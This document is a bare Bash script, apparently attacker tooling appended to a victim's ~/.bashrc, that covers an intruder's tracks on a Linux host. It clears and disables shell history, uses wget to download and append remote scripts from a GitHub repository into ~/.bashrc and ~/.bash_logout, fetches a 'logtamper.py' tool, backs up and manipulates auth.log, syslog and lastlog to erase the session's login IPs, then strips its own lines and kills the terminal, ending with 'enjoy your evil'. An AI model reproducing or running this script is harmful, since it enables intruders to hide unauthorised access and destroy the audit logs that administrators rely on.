history -c; #_fdsagadsfasdgadsgsss
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; #_fdsagadsfasdgadsgsss
export HISTFILE=/dev/null; #_fdsagadsfasdgadsgsss
export HISTSIZE=0; #_fdsagadsfasdgadsgsss
export HISTFILESIZE=0; #_fdsagadsfasdgadsgsss
export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ $? -ne 0 ];then cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f ~/.bash_logout ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> ~/.bash_logout; fi ; . ~/.bash_logout;" #_fdsagadsfasdgadsgsss
REST="\e[0m" #_fdsagadsfasdgadsgsss
UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
ColorGreen="\e[32m" #_fdsagadsfasdgadsgsss
ColorYellow="\e[33m" #_fdsagadsfasdgadsgsss
ColorBlue="\e[34m" #_fdsagadsfasdgadsgsss
ColorMagenta="\e[35m" #_fdsagadsfasdgadsgsss
ColorCyan="\e[36m" #_fdsagadsfasdgadsgsss
FLAG="" #_fdsagadsfasdgadsgsss
my_name="$(whoami)" #_fdsagadsfasdgadsgsss
my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
my_ips=/tmp/_asdgninvidsfasdg125125sadsaf; #_fdsagadsfasdgadsgsss
index_f=/tmp/_fadsgindexfs; #_fdsagadsfasdgadsgsss
clear_shell=/tmp/asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
function _bak { #_fdsagadsfasdgadsgsss
  if [ -f $1 ];then #_fdsagadsfasdgadsgsss
    cp -v $1 /tmp/  2>/dev/null #_fdsagadsfasdgadsgsss
    echo $1 >> $index_f #_fdsagadsfasdgadsgsss
  fi #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function _resume { #_fdsagadsfasdgadsgsss
  for i in $(cat $index_f); #_fdsagadsfasdgadsgsss
  do #_fdsagadsfasdgadsgsss
    if [ -f $1 ];then #_fdsagadsfasdgadsgsss
      mv $i /var/log/  2>/dev/null; #_fdsagadsfasdgadsgsss
      if [ $? -eq 0 ];then #_fdsagadsfasdgadsgsss
     gglog $i " [resume]" #_fdsagadsfasdgadsgsss
      fi #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
  done #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function gglog { #_fdsagadsfasdgadsgsss
    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}" #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function CL { #_fdsagadsfasdgadsgsss
    if [ -f $clear_shell ];then #_fdsagadsfasdgadsgsss
    for ip_one in $(cat $my_ips);do #_fdsagadsfasdgadsgsss
        gglog "clear $my_name $ip_one" #_fdsagadsfasdgadsgsss
            python $clear_shell -m 2 -u $my_name -i $ip_one ; #_fdsagadsfasdgadsgsss
            python $clear_shell -m 1 -u $my_name -i $ip_one ; #_fdsagadsfasdgadsgsss
        done #_fdsagadsfasdgadsgsss
    else #_fdsagadsfasdgadsgsss
    gglog "no cl to found" #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function ByeHack { #_fdsagadsfasdgadsgsss
    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_logout #_fdsagadsfasdgadsgsss
    CL #_fdsagadsfasdgadsgsss
    _resume; #_fdsagadsfasdgadsgsss
    rm $my_ips; #_fdsagadsfasdgadsgsss
    rm $index_f; #_fdsagadsfasdgadsgsss
    rm $clear_shell; #_fdsagadsfasdgadsgsss
    pkill -9 $my_pts; #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function __safebyeCheck { #_fdsagadsfasdgadsgsss
    if [ ! -f ~/.bash_logout ];then #_fdsagadsfasdgadsgsss
        wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
    else #_fdsagadsfasdgadsgsss
        if [[ "$(grep '_asdgninvidsfasdg125125sadsaf' ~/.bash_logout)" == ""  ]];then #_fdsagadsfasdgadsgsss
            wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
        fi #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
    . ~/.bash_logout #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
if [ !  -f $clear_shell ];then #_fdsagadsfasdgadsgsss
    wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell; #_fdsagadsfasdgadsgsss
    gglog "Download logtamper ok" #_fdsagadsfasdgadsgsss
fi #_fdsagadsfasdgadsgsss
last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips #_fdsagadsfasdgadsgsss
_bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
_bak /var/log/syslog; #_fdsagadsfasdgadsgsss
_bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
if [ ! -f ~/.bash_logout ];then #_fdsagadsfasdgadsgsss
    wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
else #_fdsagadsfasdgadsgsss
   if [[ "$(grep 'ByeHack' ~/.bash_logout)" == ""  ]];then #_fdsagadsfasdgadsgsss
      wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
   fi #_fdsagadsfasdgadsgsss
fi #_fdsagadsfasdgadsgsss
if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then #_fdsagadsfasdgadsgsss
    gglog "warnning user is logined in !!!! , so exit "; #_fdsagadsfasdgadsgsss
    ByeHack; #_fdsagadsfasdgadsgsss
else #_fdsagadsfasdgadsgsss
    gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
fi #_fdsagadsfasdgadsgsss
